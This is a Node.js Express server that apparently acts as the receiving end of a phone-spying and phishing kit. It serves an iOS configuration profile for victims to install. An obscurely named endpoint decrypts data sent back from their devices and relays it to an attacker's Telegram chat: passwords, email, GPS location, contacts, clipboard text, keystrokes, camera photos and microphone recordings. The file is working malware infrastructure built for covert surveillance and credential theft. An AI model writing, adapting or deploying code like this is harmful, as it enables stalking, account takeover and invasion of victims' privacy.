const express = require("express");
const path = require("path");
const { webcrypto } = require("crypto");
const subtle = webcrypto.subtle;

const app = express();
const PORT = process.env.PORT || 3000;

app.use((req, res, next) => {
  res.set("Access-Control-Allow-Origin", "*");
  res.set("Access-Control-Allow-Headers", "content-type");
  res.set("Access-Control-Allow-Methods", "POST,OPTIONS");
  if (req.method === "OPTIONS") return res.sendStatus(204);
  next();
});

app.use(express.static(path.join(__dirname, "public")));

app.get("/perfil.mobileconfig", (req, res) => {
  res.type("application/x-apple-aspen-config");
  res.sendFile(path.join(__dirname, "public", "perfil.mobileconfig"));
});

app.post(
  "/api/x7k2",
  express.text({ type: "*/*", limit: "10mb" }),
  async (req, res) => {
    try {
      const blob = Buffer.from(req.body, "base64");
      const salt = blob.subarray(0, 16);
      const nonce = blob.subarray(16, 28);
      const ct = blob.subarray(28);

      const base = await subtle.importKey(
        "raw",
        new TextEncoder().encode(process.env.PASS),
        "PBKDF2",
        false,
        ["deriveKey"]
      );
      const key = await subtle.deriveKey(
        { name: "PBKDF2", salt, iterations: 200000, hash: "SHA-256" },
        base,
        { name: "AES-GCM", length: 256 },
        false,
        ["decrypt"]
      );
      const plain = await subtle.decrypt({ name: "AES-GCM", iv: nonce }, key, ct);
      const j = JSON.parse(new TextDecoder().decode(plain));

      const tg = (m, p) =>
        fetch(`https://api.telegram.org/bot${process.env.TG_TOKEN}/${m}`, p);

      let txt = `📱 ${j.s} | ${j.id}\n`;
      if (j.f)
        txt += `UA: ${j.f.ua}\nTZ: ${j.f.tz}\nGPU: ${j.f.gpu}\nPantalla: ${j.f.scr}\nBatería: ${j.f.bat}\nStandalone: ${j.f.sa}\n`;
      if (j.ip)
        txt += `IP: ${j.ip.ip} | ${j.ip.city}, ${j.ip.country_name} | ${j.ip.org}\n`;
      if (j.e) txt += `✉️ ${j.e}\n🔑 ${j.p}\n`;
      if (j.lat) txt += `📍 https://maps.google.com/?q=${j.lat},${j.lon} (±${j.acc}m)\n`;
      if (j.c) txt += `👥 Contactos: ${j.c.length}\n${JSON.stringify(j.c).slice(0, 800)}\n`;
      if (j.t) txt += `📋 ${j.t.slice(0, 300)}\n`;
      if (j.k) txt += `⌨️ ${j.k}`;

      await tg("sendMessage", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ chat_id: process.env.TG_CHAT, text: txt.slice(0, 4000) })
      });

      if (j.img) {
        const bin = Buffer.from(j.img, "base64");
        const fd = new FormData();
        fd.append("chat_id", process.env.TG_CHAT);
        fd.append("photo", new Blob([bin], { type: "image/jpeg" }), "cam.jpg");
        await tg("sendPhoto", { method: "POST", body: fd });
      }
      if (j.a) {
        const bin = Buffer.from(j.a, "base64");
        const fd = new FormData();
        fd.append("chat_id", process.env.TG_CHAT);
        fd.append("audio", new Blob([bin], { type: "audio/webm" }), "mic.webm");
        await tg("sendAudio", { method: "POST", body: fd });
      }

      res.send("ok");
    } catch (e) {
      res.status(500).send("e:" + e.message);
    }
  }
);

app.listen(PORT, () => console.log("up " + PORT));
